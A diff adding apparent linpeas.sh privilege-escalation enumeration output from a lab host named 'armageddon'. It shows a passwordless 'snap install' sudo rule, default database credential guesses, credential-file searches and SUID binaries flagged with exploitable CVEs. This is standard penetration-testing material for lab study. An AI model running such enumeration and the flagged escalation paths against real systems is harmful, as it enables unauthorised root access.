+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 328  bytes 32476 (31.7 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 328  bytes 32476 (31.7 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+[+] Networks and neighbours
+Kernel IP routing table                                                                                             
+Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+default         gateway         0.0.0.0         UG    100    0        0 ens192
+10.10.10.0      0.0.0.0         255.255.255.0   U     100    0        0 ens192
+Address                  HWtype  HWaddress           Flags Mask            Iface
+gateway                  ether   00:50:56:b9:17:92   C                     ens192
+
+[+] Iptables rules
+iptables rules Not Found                                                                                            
+                                                                                                                    
+[+] Active Ports
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                                          
+tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -                                   
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 ::1:25                  :::*                    LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+
+[+] Can I sniff with tcpdump?
+No                                                                                                                  
+                                                                                                                    
+
+════════════════════════════════════╣ Users Information ╠════════════════════════════════════
+[+] My user                                                                                                         
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#users                                               
+uid=1000(brucetherealadmin) gid=1000(brucetherealadmin) groups=1000(brucetherealadmin) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+
+[+] Do I have PGP keys?
+/usr/bin/gpg                                                                                                        
+netpgpkeys Not Found
+netpgp Not Found                                                                                                    
+                                                                                                                    
+[+] Clipboard or highlighted text?
+xsel and xclip Not Found                                                                                            
+                                                                                                                    
+[+] Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                       
+Matching Defaults entries for brucetherealadmin on armageddon:                                                      
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User brucetherealadmin may run the following commands on armageddon:
+    (root) NOPASSWD: /usr/bin/snap install *
+
+[+] Checking sudo tokens
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#reusing-sudo-tokens                                 
+/proc/sys/kernel/yama/ptrace_scope is enabled (0)                                                                   
+gdb wasn't found in PATH
+
+[+] Checking doas.conf
+/etc/doas.conf Not Found                                                                                            
+                                                                                                                    
+[+] Checking Pkexec policy
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2             
+                                                                                                                    
+[+] Superusers
+root:x:0:0:root:/root:/bin/bash                                                                                     
+
+[+] Users with console
+brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash                                                    
+root:x:0:0:root:/root:/bin/bash
+
+[+] All users & groups
+uid=0(root) gid=0(root) groups=0(root)                                                                              
+uid=1000(brucetherealadmin) gid=1000(brucetherealadmin) groups=1000(brucetherealadmin)
+uid=11(operator) gid=0(root) groups=0(root)
+uid=12(games) gid=100(users) groups=100(users)
+uid=14(ftp) gid=50(ftp) groups=50(ftp)
+uid=192(systemd-network) gid=192(systemd-network) groups=192(systemd-network)
+uid=1(bin) gid=1(bin) groups=1(bin)
+uid=27(mysql) gid=27(mysql) groups=27(mysql)
+uid=2(daemon[0m) gid=2(daemon[0m) groups=2(daemon[0m)
+uid=3(adm) gid=4(adm) groups=4(adm)
+uid=48(apache) gid=48(apache) groups=48(apache)
+uid=4(lp) gid=7(lp) groups=7(lp)
+uid=5(sync) gid=0(root) groups=0(root)
+uid=6(shutdown) gid=0(root) groups=0(root)
+uid=74(sshd) gid=74(sshd) groups=74(sshd)
+uid=7(halt) gid=0(root) groups=0(root)
+uid=81(dbus) gid=81(dbus) groups=81(dbus)
+uid=89(postfix) gid=89(postfix) groups=89(postfix),12(mail)
+uid=8(mail) gid=12(mail) groups=12(mail)
+uid=999(polkitd) gid=998(polkitd) groups=998(polkitd)
+uid=99(nobody) gid=99(nobody) groups=99(nobody)
+
+[+] Login now
+ 00:43:31 up  1:53,  1 user,  load average: 0.29, 0.14, 0.09                                                        
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+brucethe pts/0    10.10.14.10      00:40    1:07   0.20s  0.00s bash linpeas.sh
+
+[+] Last logons
+root     pts/0        Thu Dec  3 10:30:11 2020 - Thu Dec  3 11:34:29 2020  (01:04)     10.10.14.4                   
+root     pts/0        Thu Dec  3 09:57:06 2020 - Thu Dec  3 10:28:48 2020  (00:31)     10.10.14.4
+root     pts/0        Thu Dec  3 09:56:41 2020 - Thu Dec  3 09:57:01 2020  (00:00)     10.10.14.4
+root     tty1         Thu Dec  3 09:53:14 2020 - Thu Dec  3 09:57:12 2020  (00:03)     0.0.0.0
+reboot   system boot  Thu Dec  3 09:52:22 2020 - Mon Dec 14 18:37:51 2020 (11+08:45)   0.0.0.0
+root     tty1         Thu Dec  3 09:18:16 2020 - Thu Dec  3 09:50:24 2020  (00:32)     0.0.0.0
+root     tty1         Wed Dec  2 16:25:31 2020 - Wed Dec  2 19:28:34 2020  (03:03)     0.0.0.0
+reboot   system boot  Wed Dec  2 15:25:16 2020 - Thu Dec  3 09:50:25 2020  (18:25)     0.0.0.0
+
+wtmp begins Wed Dec  2 15:25:16 2020
+
+[+] Last time logon each user
+Username         Port     From             Latest                                                                   
+root             tty1                      Tue Mar 23 12:58:10 +0000 2021
+brucetherealadmin pts/0    10.10.14.10      Mon Jul 26 00:40:20 +0100 2021
+
+[+] Password policy
+PASS_MAX_DAYS   99999                                                                                               
+PASS_MIN_DAYS   0
+PASS_WARN_AGE   7
+ENCRYPT_METHOD SHA512
+
+[+] Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)                                                                                                       
+[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!                   
+                                                                                                                    
+
+═══════════════════════════════════╣ Software Information ╠═══════════════════════════════════
+[+] MySQL version                                                                                                   
+mysql  Ver 15.1 Distrib 5.5.68-MariaDB, for Linux (x86_64) using readline 5.1                                       
+
+[+] MySQL connection using default root/root ........... No
+[+] MySQL connection using root/toor ................... No                                                         
+[+] MySQL connection using root/NOPASS ................. No                                                         
+[+] Searching mysql credentials and exec                                                                            
+                                                                                                                    
+[+] PostgreSQL version and pgadmin credentials
+ Not Found                                                                                                          
+                                                                                                                    
+[+] PostgreSQL connection to template0 using postgres/NOPASS ........ No
+[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No                                            
+[+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No                                            
+[+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No                                            
+                                                                                                                    
+[+] Apache server info
+Version: Server version: Apache/2.4.6 (CentOS)                                                                      
+Server built:   Nov 16 2020 16:18:20
+PHP exec extensions
+
+[+] Searching PHPCookies
+ Not Found                                                                                                          
+                                                                                                                    
+[+] Searching Wordpress wp-config.php files
+wp-config.php Not Found                                                                                             
+                                                                                                                    
+[+] Searching Drupal settings.php files
+/default/settings.php Not Found                                                                                     
+                                                                                                                    
+[+] Searching Moodle config.php files
+config.php inside a moodle folder Not Found                                                                         
+                                                                                                                    
+[+] Searching Tomcat users file
+tomcat-users.xml Not Found                                                                                          
+                                                                                                                    
+[+] Mongo information
+mongo binary Not Found                                                                                              
+                                                                                                                    
+[+] Searching supervisord configuration file
+supervisord.conf Not Found                                                                                          
+                                                                                                                    
+[+] Searching cesi configuration file
+cesi.conf Not Found                                                                                                 
+                                                                                                                    
+[+] Searching Rsyncd config file
+rsyncd.conf Not Found                                                                                               
+                                                                                                                    
+[+] Searching Hostapd config file
+hostapd.conf Not Found                                                                                              
+                                                                                                                    
+[+] Searching wifi conns file
+ Not Found                                                                                                          
+                                                                                                                    
+[+] Searching Anaconda-ks config files
+anaconda-ks.cfg Not Found                                                                                           
+                                                                                                                    
+[+] Searching .vnc directories and their passwd files
+.vnc Not Found                                                                                                      
+                                                                                                                    
+[+] Searching ldap directories and their hashes
+ldap Not Found                                                                                                      
+                                                                                                                    
+[+] Searching .ovpn files and credentials
+.ovpn Not Found                                                                                                     
+                                                                                                                    
+[+] Searching ssl/ssh files
+  --> Some certificates were found (out limited):                                                                   
+/var/lib/snapd/snap/core/10444/etc/ssl/certs/ca-certificates.crt
+/var/lib/snapd/snap/core/10444/lib/crda/pubkeys/benh@debian.org.key.pub.pem
+/var/lib/snapd/snap/core/10444/lib/crda/pubkeys/linville.key.pub.pem
+/var/lib/snapd/snap/core/10444/lib/crda/pubkeys/sforshee.key.pub.pem
+/var/lib/snapd/snap/core/10444/usr/share/ca-certificates/mozilla/ACCVRAIZ1.crt
+/var/lib/snapd/snap/core/10444/usr/share/ca-certificates/mozilla/AC_RAIZ_FNMT-RCM.crt
+/var/lib/snapd/snap/core/10444/usr/share/ca-certificates/mozilla/Actalis_Authentication_Root_CA.crt
+/var/lib/snapd/snap/core/10444/usr/share/ca-certificates/mozilla/AffirmTrust_Commercial.crt
+/var/lib/snapd/snap/core/10444/usr/share/ca-certificates/mozilla/AffirmTrust_Networking.crt
+/var/lib/snapd/snap/core/10444/usr/share/ca-certificates/mozilla/AffirmTrust_Premium.crt
+/var/lib/snapd/snap/core/10444/usr/share/ca-certificates/mozilla/AffirmTrust_Premium_ECC.crt
+/var/lib/snapd/snap/core/10444/usr/share/ca-certificates/mozilla/Amazon_Root_CA_1.crt
+/var/lib/snapd/snap/core/10444/usr/share/ca-certificates/mozilla/Amazon_Root_CA_2.crt
+/var/lib/snapd/snap/core/10444/usr/share/ca-certificates/mozilla/Amazon_Root_CA_3.crt
+/var/lib/snapd/snap/core/10444/usr/share/ca-certificates/mozilla/Amazon_Root_CA_4.crt
+/var/lib/snapd/snap/core/10444/usr/share/ca-certificates/mozilla/Atos_TrustedRoot_2011.crt
+/var/lib/snapd/snap/core/10444/usr/share/ca-certificates/mozilla/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.crt
+/var/lib/snapd/snap/core/10444/usr/share/ca-certificates/mozilla/Baltimore_CyberTrust_Root.crt
+/var/lib/snapd/snap/core/10444/usr/share/ca-certificates/mozilla/Buypass_Class_2_Root_CA.crt
+/var/lib/snapd/snap/core/10444/usr/share/ca-certificates/mozilla/Buypass_Class_3_Root_CA.crt
+
+ --> /etc/hosts.allow file found, read the rules:
+/etc/hosts.allow
+
+
+Searching inside /etc/ssh/ssh_config for interesting info
+Host *
+        GSSAPIAuthentication yes
+        ForwardX11Trusted yes
+        SendEnv LANG LC_CTYPE LC_NUMERIC LC_TIME LC_COLLATE LC_MONETARY LC_MESSAGES
+        SendEnv LC_PAPER LC_NAME LC_ADDRESS LC_TELEPHONE LC_MEASUREMENT
+        SendEnv LC_IDENTIFICATION LC_ALL LANGUAGE
+        SendEnv XMODIFIERS
+
+[+] Searching unexpected auth lines in /etc/pam.d/sshd
+auth       required     pam_sepermit.so                                                                             
+auth       substack     password-auth
+auth       include      postlogin
+-auth      optional     pam_reauthorize.so prepare
+account    include      password-auth
+password   include      password-auth
+session    include      password-auth
+-session   optional     pam_reauthorize.so prepare
+
+[+] Searching Cloud credentials (AWS, Azure, GC)
+                                                                                                                    
+[+] NFS exports?
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe              
+/etc/exports Not Found                                                                                              
+                                                                                                                    
+[+] Searching kerberos conf files and tickets
+[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt                               
+-rw-r--r--. 1 root root 646 Sep 30  2020 /etc/krb5.conf                                                             
+ default_ccache_name = KEYRING:persistent:%{uid}
+-rw-r--r--. 1 root root 369 Sep 30  2020 /usr/share/doc/krb5-libs-1.15.1/examples/krb5.conf
+tickets kerberos Not Found
+klist Not Found                                                                                                     
+                                                                                                                    
+[+] Searching Kibana yaml
+kibana.yml Not Found                                                                                                
+                                                                                                                    
+[+] Searching Knock configuration
+Knock.config Not Found                                                                                              
+                                                                                                                    
+[+] Searching logstash files
+ Not Found                                                                                                          
+                                                                                                                    
+[+] Searching elasticsearch files
+ Not Found                                                                                                          
+                                                                                                                    
+[+] Searching Vault-ssh files
+vault-ssh-helper.hcl Not Found                                                                                      
+                                                                                                                    
+[+] Searching AD cached hashes
+cached hashes Not Found                                                                                             
+                                                                                                                    
+[+] Searching screen sessions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                 
+screen Not Found                                                                                                    
+                                                                                                                    
+[+] Searching tmux sessions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                 
+tmux Not Found                                                                                                      
+                                                                                                                    
+[+] Searching Couchdb directory
+                                                                                                                    
+[+] Searching redis.conf
+                                                                                                                    
+[+] Searching dovecot files
+dovecot credentials Not Found                                                                                       
+                                                                                                                    
+[+] Searching mosquitto.conf
+                                                                                                                    
+[+] Searching neo4j auth file
+                                                                                                                    
+[+] Searching Cloud-Init conf file
+Found readable /var/lib/snapd/snap/core/10444/etc/cloud/cloud.cfg                                                   
+     lock_passwd: True
+Found readable /var/lib/snapd/snap/core/10859/etc/cloud/cloud.cfg
+     lock_passwd: True
+
+[+] Searching Erlang cookie file
+                                                                                                                    
+[+] Searching GVM auth file
+                                                                                                                    
+[+] Searching IPSEC files
+                                                                                                                    
+[+] Searching IRSSI files
+                                                                                                                    
+[+] Searching Keyring files
+Keyring folder: /var/lib/snapd/snap/core/10444/usr/share/keyrings                                                   
+/var/lib/snapd/snap/core/10444/usr/share/keyrings:
+total 16
+-rw-r--r--. 1 root root 14076 Jun  3  2020 ubuntu-archive-keyring.gpg
+-rw-r--r--. 1 root root     0 Jun  3  2020 ubuntu-archive-removed-keys.gpg
+-rw-r--r--. 1 root root  1227 Jun  3  2020 ubuntu-master-keyring.gpg
+Keyring folder: /var/lib/snapd/snap/core/10859/usr/share/keyrings
+/var/lib/snapd/snap/core/10859/usr/share/keyrings:
+total 16
+-rw-r--r--. 1 root root 14076 Jun  3  2020 ubuntu-archive-keyring.gpg
+-rw-r--r--. 1 root root     0 Jun  3  2020 ubuntu-archive-removed-keys.gpg
+-rw-r--r--. 1 root root  1227 Jun  3  2020 ubuntu-master-keyring.gpg
+
+[+] Searching Filezilla sites file
+                                                                                                                    
+[+] Searching backup-manager files
+                                                                                                                    
+[+] Searching uncommon passwd files (splunk)
+passwd file: /etc/pam.d/passwd                                                                                      
+passwd file: /usr/share/bash-completion/completions/passwd
+passwd file: /var/lib/snapd/snap/core/10444/etc/pam.d/passwd
+passwd file: /var/lib/snapd/snap/core/10444/usr/share/bash-completion/completions/passwd
+passwd file: /var/lib/snapd/snap/core/10444/var/lib/extrausers/passwd
+passwd file: /var/lib/snapd/snap/core/10859/etc/pam.d/passwd
+passwd file: /var/lib/snapd/snap/core/10859/usr/share/bash-completion/completions/passwd
+passwd file: /var/lib/snapd/snap/core/10859/var/lib/extrausers/passwd
+
+[+] Searching GitLab related files
+                                                                                                                    
+
+[+] Searching PGP/GPG
+PGP/GPG software:                                                                                                   
+/usr/bin/gpg
+netpgpkeys Not Found
+netpgp Not Found                                                                                                    
+                                                                                                                    
+[+] Searching vim files
+                                                                                                                    
+[+] Checking if containerd(ctr) is available
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/containerd-ctr-privilege-escalation                 
+                                                                                                                    
+[+] Checking if runc is available
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/runc-privilege-escalation                           
+                                                                                                                    
+[+] Searching docker files (limit 100)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-docker-socket                              
+                                                                                                                    
+[+] Interesting Firefox Files
+[i] https://book.hacktricks.xyz/forensics/basic-forensics-esp/browser-artifacts#firefox                             
+                                                                                                                    
+[+] Interesting Chrome Files
+[i] https://book.hacktricks.xyz/forensics/basic-forensics-esp/browser-artifacts#firefox                             
+                                                                                                                    
+[+] Autologin Files
+                                                                                                                    
+[+] S/Key authentication
+                                                                                                                    
+[+] YubiKey authentication
+                                                                                                                    
+[+] Passwords inside pam.d
+                                                                                                                    
+[+] FastCGI Params
+                                                                                                                    
+[+] SNMPs
+                                                                                                                    
+
+[+] Pypirc
+                                                                                                                    
+
+
+
+════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════
+[+] SUID - Check easy privesc, exploits and write perms                                                             
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                       
+strace Not Found                                                                                                    
+-rwsr-xr-x. 1 root root  44K May  7  2014 /var/lib/snapd/snap/core/10859/bin/ping6                                  
+-rwsr-xr-x. 1 root root  44K May  7  2014 /var/lib/snapd/snap/core/10859/bin/ping
+-rwsr-xr-x. 1 root root  44K May  7  2014 /var/lib/snapd/snap/core/10444/bin/ping6
+-rwsr-xr-x. 1 root root  44K May  7  2014 /var/lib/snapd/snap/core/10444/bin/ping
+-rwsr-xr-x. 1 root root  32K Oct 30  2018 /usr/bin/fusermount
+-rwsr-xr-x. 1 root root  53K Mar 25  2019 /var/lib/snapd/snap/core/10859/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                  
+-rwsr-xr-x. 1 root root  74K Mar 25  2019 /var/lib/snapd/snap/core/10859/usr/bin/gpasswd
+-rwsr-xr-x. 1 root root  40K Mar 25  2019 /var/lib/snapd/snap/core/10859/usr/bin/chsh
+-rwsr-xr-x. 1 root root  71K Mar 25  2019 /var/lib/snapd/snap/core/10859/usr/bin/chfn  --->  SuSE_9.3/10
+-rwsr-xr-x. 1 root root  53K Mar 25  2019 /var/lib/snapd/snap/core/10444/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                  
+-rwsr-xr-x. 1 root root  74K Mar 25  2019 /var/lib/snapd/snap/core/10444/usr/bin/gpasswd
+-rwsr-xr-x. 1 root root  40K Mar 25  2019 /var/lib/snapd/snap/core/10444/usr/bin/chsh
+-rwsr-xr-x. 1 root root  71K Mar 25  2019 /var/lib/snapd/snap/core/10444/usr/bin/chfn  --->  SuSE_9.3/10
+-rwsr-xr-x. 1 root root  39K Mar 25  2019 /var/lib/snapd/snap/core/10859/usr/bin/newgrp  --->  HP-UX_10.20
+-rwsr-xr-x. 1 root root  40K Mar 25  2019 /var/lib/snapd/snap/core/10859/bin/su
+-rwsr-xr-x. 1 root root  39K Mar 25  2019 /var/lib/snapd/snap/core/10444/usr/bin/newgrp  --->  HP-UX_10.20
+-rwsr-xr-x. 1 root root  40K Mar 25  2019 /var/lib/snapd/snap/core/10444/bin/su
+-rwsr-xr-x. 1 root root  57K Aug  9  2019 /usr/bin/crontab
+-rwsr-xr-x. 1 root root  41K Aug  9  2019 /usr/bin/newgrp  --->  HP-UX_10.20
+-rwsr-xr-x. 1 root root  77K Aug  9  2019 /usr/bin/gpasswd
+-rwsr-xr-x. 1 root root  73K Aug  9  2019 /usr/bin/chage
+-rwsr-xr-x. 1 root root  27K Jan 27  2020 /var/lib/snapd/snap/core/10859/bin/umount  --->  BSD/Linux(08-1996)
+-rwsr-xr-x. 1 root root  40K Jan 27  2020 /var/lib/snapd/snap/core/10859/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                                                 
+-rwsr-xr-x. 1 root root  27K Jan 27  2020 /var/lib/snapd/snap/core/10444/bin/umount  --->  BSD/Linux(08-1996)
+-rwsr-xr-x. 1 root root  40K Jan 27  2020 /var/lib/snapd/snap/core/10444/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                                                 
+-rwsr-xr-x. 1 root root 134K Jan 31  2020 /var/lib/snapd/snap/core/10444/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable                                                                                                    
+-rwsr-xr-x. 1 root root  28K Apr  1  2020 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                                
+-rwsr-xr-x. 1 root root  36K Apr  1  2020 /usr/sbin/unix_chkpwd
+-rwsr-xr-x. 1 root root  11K Apr  1  2020 /usr/sbin/pam_timestamp_check
+-rwsr-xr-x. 1 root root  16K Apr  1  2020 /usr/lib/polkit-1/polkit-agent-helper-1
+-rwsr-xr-x. 1 root root  24K Apr  1  2020 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)                                                                                                              
+-rwsr-xr-x. 1 root root 419K May 27  2020 /var/lib/snapd/snap/core/10859/usr/lib/openssh/ssh-keysign
+-rwsr-xr-x. 1 root root 419K May 27  2020 /var/lib/snapd/snap/core/10444/usr/lib/openssh/ssh-keysign
+-rwsr-xr--. 1 root  103  42K Jun 11  2020 /var/lib/snapd/snap/core/10859/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr--. 1 root  103  42K Jun 11  2020 /var/lib/snapd/snap/core/10444/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr--. 1 root   30 386K Jul 23  2020 /var/lib/snapd/snap/core/10859/usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)                                                                                                             
+-rwsr-xr--. 1 root   30 386K Jul 23  2020 /var/lib/snapd/snap/core/10444/usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)                                                                                                             
+-rwsr-x---. 1 root dbus  57K Sep 30  2020 /usr/libexec/dbus-1/dbus-daemon-launch-helper
+-rwsr-xr-x. 1 root root  32K Sep 30  2020 /usr/bin/umount  --->  BSD/Linux(08-1996)
+-rwsr-xr-x. 1 root root  32K Sep 30  2020 /usr/bin/su
+-rwsr-xr-x. 1 root root  44K Sep 30  2020 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                                                                           
+-rws--x--x. 1 root root  24K Sep 30  2020 /usr/bin/chsh
+-rws--x--x. 1 root root  24K Sep 30  2020 /usr/bin/chfn  --->  SuSE_9.3/10
+-rwsr-xr-x. 1 root root  95K Oct 14  2020 /usr/libexec/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)                                                                                 
+-rwsr-xr-x. 1 root root  12K Nov 16  2020 /usr/sbin/usernetctl
+-rwsr-xr-x. 1 root root 109K Nov 19  2020 /var/lib/snapd/snap/core/10444/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)                                                       
+-rwsr-xr-x. 1 root root 134K Jan 20  2021 /var/lib/snapd/snap/core/10859/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable                                                                                                    
+---s--x--x. 1 root root 144K Jan 26 21:56 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
+-rwsr-xr-x. 1 root root 109K Feb 10 10:09 /var/lib/snapd/snap/core/10859/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)                                                       
+
+[+] SGID
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                       
+-rwxr-sr-x. 3 root mem       15K Dec  3  2012 /var/lib/snapd/snap/core/10859/usr/bin/mail-unlock                    
+-rwxr-sr-x. 3 root mem       15K Dec  3  2012 /var/lib/snapd/snap/core/10859/usr/bin/mail-touchlock
+-rwxr-sr-x. 3 root mem       15K Dec  3  2012 /var/lib/snapd/snap/core/10859/usr/bin/mail-lock
+-rwxr-sr-x. 3 root mem       15K Dec  3  2012 /var/lib/snapd/snap/core/10444/usr/bin/mail-unlock
+-rwxr-sr-x. 3 root mem       15K Dec  3  2012 /var/lib/snapd/snap/core/10444/usr/bin/mail-touchlock
+-rwxr-sr-x. 3 root mem       15K Dec  3  2012 /var/lib/snapd/snap/core/10444/usr/bin/mail-lock
+-rwxr-sr-x. 1 root mem       15K Dec  7  2013 /var/lib/snapd/snap/core/10859/usr/bin/dotlockfile
+-rwxr-sr-x. 1 root mem       15K Dec  7  2013 /var/lib/snapd/snap/core/10444/usr/bin/dotlockfile
+-r-xr-sr-x. 1 root tty       15K Jun 10  2014 /usr/bin/wall
+-rwx--s--x. 1 root utmp      11K Jun 10  2014 /usr/libexec/utempter/utempter
+-rwxr-sr-x. 1 root      102  36K Apr  5  2016 /var/lib/snapd/snap/core/10859/usr/bin/crontab
+-rwxr-sr-x. 1 root      102  36K Apr  5  2016 /var/lib/snapd/snap/core/10444/usr/bin/crontab
+-rwxr-sr-x. 1 root       42  23K Mar 25  2019 /var/lib/snapd/snap/core/10859/usr/bin/expiry
+-rwxr-sr-x. 1 root       42  61K Mar 25  2019 /var/lib/snapd/snap/core/10859/usr/bin/chage
+-rwxr-sr-x. 1 root       42  23K Mar 25  2019 /var/lib/snapd/snap/core/10444/usr/bin/expiry
+-rwxr-sr-x. 1 root       42  61K Mar 25  2019 /var/lib/snapd/snap/core/10444/usr/bin/chage
+---x--s--x. 1 root ssh_keys 455K Aug  9  2019 /usr/libexec/openssh/ssh-keysign
+---x--s--x. 1 root nobody   374K Aug  9  2019 /usr/bin/ssh-agent
+-rwxr-sr-x. 1 root tty       27K Jan 27  2020 /var/lib/snapd/snap/core/10859/usr/bin/wall
+-rwxr-sr-x. 1 root tty       27K Jan 27  2020 /var/lib/snapd/snap/core/10444/usr/bin/wall
+-rwxr-sr-x. 1 root postdrop 258K Apr  1  2020 /usr/sbin/postqueue
+-rwxr-sr-x. 1 root postdrop 214K Apr  1  2020 /usr/sbin/postdrop
+-rwxr-sr-x. 1 root      105 351K May 27  2020 /var/lib/snapd/snap/core/10859/usr/bin/ssh-agent
+-rwxr-sr-x. 1 root      105 351K May 27  2020 /var/lib/snapd/snap/core/10444/usr/bin/ssh-agent
+-rwxr-sr-x. 1 root tty       20K Sep 30  2020 /usr/bin/write
+-rwxr-sr-x. 1 root       42  35K Oct  1  2020 /var/lib/snapd/snap/core/10859/sbin/unix_chkpwd
+-rwxr-sr-x. 1 root       42  35K Oct  1  2020 /var/lib/snapd/snap/core/10859/sbin/pam_extrausers_chkpwd
+-rwxr-sr-x. 1 root       42  35K Oct  1  2020 /var/lib/snapd/snap/core/10444/sbin/unix_chkpwd
+-rwxr-sr-x. 1 root       42  35K Oct  1  2020 /var/lib/snapd/snap/core/10444/sbin/pam_extrausers_chkpwd
+-rwxr-sr-x. 1 root root      11K Nov 16  2020 /usr/sbin/netreport
+
+[+] Checking misconfigurations of ld.so
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld-so                                               
+/etc/ld.so.conf                                                                                                     
+include ld.so.conf.d/*.conf
+ld.so.conf.d
+  ld.so.conf.d/*
+cat: ld.so.conf.d/*: No such file or directory
+
+[+] Capabilities
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                        
+Current capabilities:                                                                                               
+Current: =
+CapInh: 0000000000000000
+CapPrm: 0000000000000000
+CapEff: 0000000000000000
+CapBnd: 0000001fffffffff
+CapAmb: 0000000000000000
+
+Shell capabilities:
+0x0000000000000000=
+CapInh: 0000000000000000
+CapPrm: 0000000000000000
+CapEff: 0000000000000000
+CapBnd: 0000001fffffffff
+CapAmb: 0000000000000000
+
+Files with capabilities (limited to 50):
+/usr/bin/ping = cap_net_admin,cap_net_raw+p
+/usr/bin/newgidmap = cap_setgid+ep
+/usr/bin/newuidmap = cap_setuid+ep
+/usr/sbin/clockdiff = cap_net_raw+p
+/usr/sbin/arping = cap_net_raw+p
+/usr/sbin/suexec = cap_setgid,cap_setuid+ep
+
+[+] Users with capabilities
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                        
+/etc/security/capability.conf Not Found                                                                             
+                                                                                                                    
+[+] Files with ACLs (limited to 50)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#acls                                                
+files with acls in searched folders Not Found                                                                       
+                                                                                                                    
+[+] .sh files in path
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path                             
+/usr/bin/gettext.sh                                                                                                 
+/usr/bin/setup-nsssysinit.sh
+/usr/bin/lesspipe.sh
+/usr/bin/rescan-scsi-bus.sh
+
+[+] Unexpected in root
+                                                                                                                    
+[+] Files (scripts) in /etc/profile.d/
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#profiles-files                                      
+total 88                                                                                                            
+drwxr-xr-x.  2 root root 4096 Dec 11  2020 .
+drwxr-xr-x. 77 root root 8192 Jul 25 22:50 ..
+-rw-r--r--.  1 root root  771 Nov 16  2020 256term.csh
+-rw-r--r--.  1 root root  841 Nov 16  2020 256term.sh
+-rw-r--r--.  1 root root  660 Apr  1  2020 bash_completion.sh
+-rw-r--r--.  1 root root  196 Mar 24  2017 colorgrep.csh
